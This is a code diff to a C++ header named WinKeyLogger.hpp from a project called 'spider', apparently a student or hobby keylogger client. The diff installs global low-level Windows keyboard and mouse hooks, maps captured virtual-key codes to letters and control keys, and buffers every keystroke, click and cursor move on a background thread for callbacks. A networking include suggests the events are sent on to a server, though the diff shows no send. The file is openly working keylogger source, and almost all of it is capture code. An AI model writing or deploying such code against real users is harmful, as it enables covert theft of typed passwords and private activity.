@@ -5,50 +5,74 @@
 #ifndef SPIDER_CLIENT_WINKEYLOGGER_HPP
 #define SPIDER_CLIENT_WINKEYLOGGER_HPP
 
+#include <WindowsX.h>
 #include <memory>
 #include <utility>
-#include <WindowsX.h>
+#include <mutex>
+#include <boost/bind.hpp>
+#include <boost/circular_buffer.hpp>
+#include <boost/variant.hpp>
 #include <utils/Config.hpp>
 #include <Network/IOManager.hpp>
-#include "LazySingleton.hpp"
+#include <Protocol/Messages.hpp>
 #include "KeyLogger.hpp"
 
 namespace spi
 {
-    class WinKeyLogger : public KeyLogger, public utils::LazySingleton<WinKeyLogger>
+    class WinKeyLogger : public KeyLogger
     {
     public:
-        explicit WinKeyLogger(net::IOManager &service) : _service(service)
-        {}
+        explicit WinKeyLogger(net::IOManager *service) : _service(service), _circularBuffer(10),
+                                                         _thread{std::move([this]() {
+                                                             this->setupHooks();
+                                                             while (GetMessage(nullptr, nullptr, 0, 0));
+                                                         })}
+        {
+            _sharedInstance = this;
+        }
 
         ~WinKeyLogger() override = default;
 
-        void setup() override
+        void setup() noexcept override
         {
-            WinKeyLogger::getInstance().setupHooks();
+            onKeyboardEvent([this](proto::KeyEvent &&event) {
+                _log(logging::Debug) << KEYLOGGER_LOG << " KeyEvent {" << event.code.toString() << "}"
+                                    << std::endl;
+            });
+            onMouseMoveEvent([this](proto::MouseMove &&event) {
+                _log(logging::Debug) << KEYLOGGER_LOG << " MouseMove {\"x\": " << event.x
+                                    << ", \"y\": " << event.y << "}" << std::endl;
+            });
+            onMouseClickEvent([this](proto::MouseClick &&event) {
+                _log(logging::Debug) << KEYLOGGER_LOG << " MouseMove {\"state\": " << event.state.toString()
+                                    << ", \"button\":" << event.button.toString()
+                                    << ", \"x\":" << event.x
+                                    << ", \"y\": " << event.y << "}"
+                                    << std::endl;
+            });
         }
 
-        static LRESULT CALLBACK
-
-        MouseHookProc(int code, WPARAM wParam, LPARAM lParam)
+        static LRESULT CALLBACK MouseHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
         {
-            WinKeyLogger::getInstance().MouseHook(code, wParam, lParam);
+            sharedInstance()->MouseHook(code, wParam, lParam);
             return CallNextHookEx(nullptr, code, wParam, lParam);
         }
 
-        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam)
+        void MouseHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
         {
             if (nCode != HC_ACTION) {
                 return;
             }
             switch (wParam) {
                 case WM_MOUSEMOVE: {
-                    spi::proto::MouseMove mouseMove;
+                    proto::MouseMove mouseMove;
 
                     mouseMove.x = GET_X_LPARAM(lParam);
                     mouseMove.y = GET_Y_LPARAM(lParam);
                     mouseMove.timestamp = std::chrono::steady_clock::now();
-                    getInstance()._mouseMoveCallback(std::move(mouseMove));
+
+                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
+                    _circularBuffer.push_back({mouseMove});
                 }
                     break;
                 case WM_MBUTTONDOWN:
@@ -57,88 +81,212 @@ namespace spi
                 case WM_LBUTTONUP:
                 case WM_RBUTTONUP:
                 case WM_MBUTTONUP: {
-                    spi::proto::MouseClick event;
+                    proto::MouseClick mouseClick;
 
-                    event.x = GET_X_LPARAM(lParam);
-                    event.y = GET_Y_LPARAM(lParam);
-                    event.timestamp = std::chrono::steady_clock::now();
+                    mouseClick.x = GET_X_LPARAM(lParam);
+                    mouseClick.y = GET_Y_LPARAM(lParam);
+                    mouseClick.timestamp = std::chrono::steady_clock::now();
                     switch (wParam) {
                         case WM_MBUTTONUP:
                         case WM_LBUTTONUP:
                         case WM_RBUTTONUP:
-                            event.state = proto::KeyState::Up;
+                            mouseClick.state = proto::KeyState::Up;
                             break;
 
                         case WM_RBUTTONDOWN:
                         case WM_LBUTTONDOWN:
                         case WM_MBUTTONDOWN:
-                            event.state = proto::KeyState::Down;
+                            mouseClick.state = proto::KeyState::Down;
                             break;
                     }
                     switch (wParam) {
                         case WM_MBUTTONDOWN:
                         case WM_MBUTTONUP:
-                            event.button = spi::proto::MouseButton::Middle;
+                            mouseClick.button = proto::MouseButton::Middle;
                             break;
                         case WM_RBUTTONUP:
                         case WM_RBUTTONDOWN:
-                            event.button = spi::proto::MouseButton::Right;
+                            mouseClick.button = proto::MouseButton::Right;
                             break;
                         case WM_LBUTTONUP:
                         case WM_LBUTTONDOWN:
-                            event.button = spi::proto::MouseButton::Left;
+                            mouseClick.button = proto::MouseButton::Left;
                             break;
                     }
-                    getInstance()._mouseClickCallback(std::move(event));
+
+                    std::lock_guard<std::mutex> lock_guard(_bufferMutex);
+                    _circularBuffer.push_back({mouseClick});
                 }
                     break;
             }
         }
 
-        void KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam)
+        void KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) noexcept
         {
             if (nCode != HC_ACTION) {
                 return;
             }
+
+            static const std::unordered_map<char, proto::KeyCode> toBinds = {
+                {'A', proto::KeyCode::A},
+                {'Z', proto::KeyCode::Z},
+                {'E', proto::KeyCode::E},
+                {'R', proto::KeyCode::R},
+                {'T', proto::KeyCode::T},
+                {'Y', proto::KeyCode::Y},
+                {'U', proto::KeyCode::U},
+                {'I', proto::KeyCode::I},
+                {'O', proto::KeyCode::O},
+                {'P', proto::KeyCode::P},
+                {'Q', proto::KeyCode::Q},
+                {'S', proto::KeyCode::S},
+                {'D', proto::KeyCode::D},
+                {'F', proto::KeyCode::F},
+                {'G', proto::KeyCode::G},
+                {'H', proto::KeyCode::H},
+                {'J', proto::KeyCode::J},
+                {'K', proto::KeyCode::K},
+                {'L', proto::KeyCode::L},
+                {'M', proto::KeyCode::M},
+                {'W', proto::KeyCode::W},
+                {'X', proto::KeyCode::X},
+                {'C', proto::KeyCode::C},
+                {'V', proto::KeyCode::V},
+                {'B', proto::KeyCode::B},
+                {'N', proto::KeyCode::N},
+                {'a', proto::KeyCode::a},
+                {'z', proto::KeyCode::z},
+                {'e', proto::KeyCode::e},
+                {'r', proto::KeyCode::r},
+                {'t', proto::KeyCode::t},
+                {'y', proto::KeyCode::y},
+                {'u', proto::KeyCode::u},
+                {'i', proto::KeyCode::i},
+                {'o', proto::KeyCode::o},
+                {'p', proto::KeyCode::p},
+                {'q', proto::KeyCode::q},
+                {'s', proto::KeyCode::s},
+                {'d', proto::KeyCode::d},
+                {'f', proto::KeyCode::f},
+                {'g', proto::KeyCode::g},
+                {'h', proto::KeyCode::h},
+                {'j', proto::KeyCode::j},
+                {'k', proto::KeyCode::k},
+                {'l', proto::KeyCode::l},
+                {'m', proto::KeyCode::m},
+                {'w', proto::KeyCode::w},
+                {'x', proto::KeyCode::x},
+                {'c', proto::KeyCode::c},
+                {'v', proto::KeyCode::v},
+                {'b', proto::KeyCode::b},
+                {'n', proto::KeyCode::n},
+                {8,   proto::KeyCode::Backspace},
+                {9,   proto::KeyCode::Tab},
+                {27,  proto::KeyCode::Escape},
+                {32,  proto::KeyCode::Space},
+                {160, proto::KeyCode::Shift},
+                {162, proto::KeyCode::Ctrl},
+                {164, proto::KeyCode::Alt},
+                {165, proto::KeyCode::AltGr},
+            };
+            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN || wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
+                auto p = (PKBDLLHOOKSTRUCT)lParam;
+
+                DWORD code = p->vkCode;
+                proto::KeyEvent keyEvent;
+                keyEvent.state = wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN ? proto::KeyState::Down : proto::KeyState::Up;
+
+                if (toBinds.find(code) != toBinds.end()) {
+                    keyEvent.code = toBinds.at(code);
+                } else
+                {
+                    _log(logging::Warning) << KEYLOGGER_LOG << " Unhandled KeyEvent {" << code << "}"
+                                        << std::endl;
+                    return;
+                }
+
+                std::lock_guard<std::mutex> lock_guard(_bufferMutex);
+                _circularBuffer.push_back({keyEvent});
+            }
         }
 
-        static LRESULT CALLBACK
-
-        KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam)
+        static LRESULT CALLBACK KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) noexcept
         {
-            WinKeyLogger::getInstance().KeyboardHook(code, wParam, lParam);
+            sharedInstance()->KeyboardHook(code, wParam, lParam);
             return CallNextHookEx(nullptr, code, wParam, lParam);
         }
 
-        void setupHooks()
+        void setupHooks() noexcept
         {
             _mouseHook = SetWindowsHookEx(WH_MOUSE_LL, &MouseHookProc, nullptr, 0);
             _keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, &KeyboardHookProc, nullptr, 0);
+            _log(logging::Info) << KEYLOGGER_LOG << " [HOOKS] Successfully settled" << std::endl;
+        }
+
+        void threadFunction() noexcept
+        {
+            std::lock_guard<std::mutex> _lock_guard(_bufferMutex);
+
+            while (!_circularBuffer.empty()) {
+
+                Events &tmp = _circularBuffer.front();
+                _circularBuffer.pop_front();
+                switch (tmp.which()) {
+                    case 0:
+                        _mouseClickCallback(std::move(boost::get<proto::MouseClick>(tmp)));
+                        break;
+                    case 1:
+                        _keyPressCallback(std::move(boost::get<proto::KeyEvent>(tmp)));
+                        break;
+                    case 2:
+                        _mouseMoveCallback(std::move(boost::get<proto::MouseMove>(tmp)));
+                        break;
+                }
+            }
+            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
         }
 
         void run() override
         {
-            setupHooks();
+            _log(logging::Info) << KEYLOGGER_LOG << " Running..." << std::endl;
+            _service->get().post(boost::bind(&WinKeyLogger::threadFunction, this));
         }
 
         void stop() override
         {
             UnhookWindowsHookEx(_mouseHook);
             UnhookWindowsHookEx(_keyboardHook);
+            _log(logging::Info) << KEYLOGGER_LOG << " [HOOKS] Remove" << std::endl;
         }
 
     private:
-        net::IOManager &service;
+        net::IOManager *_service;
         HHOOK _keyboardHook{};
         HHOOK _mouseHook{};
+
+        using Events = boost::variant<proto::MouseClick, proto::KeyEvent, proto::MouseMove>;
+        boost::circular_buffer<Events> _circularBuffer;
+        std::mutex _bufferMutex;
+
+        std::thread _thread;
+
+        static WinKeyLogger *_sharedInstance;
+
+    public:
+        static WinKeyLogger *sharedInstance() noexcept
+        {
+            return _sharedInstance;
+        }
     };
+
+    WinKeyLogger *WinKeyLogger::_sharedInstance = nullptr;
 }
 
 namespace spi::details
 {
     static always_inline KeyLogPtr createKeyLogger(net::IOManager &service)
     {
-        return std::make_unique<WinKeyLogger>(service);
+        return std::make_unique<WinKeyLogger>(&service);
     }
 }
 
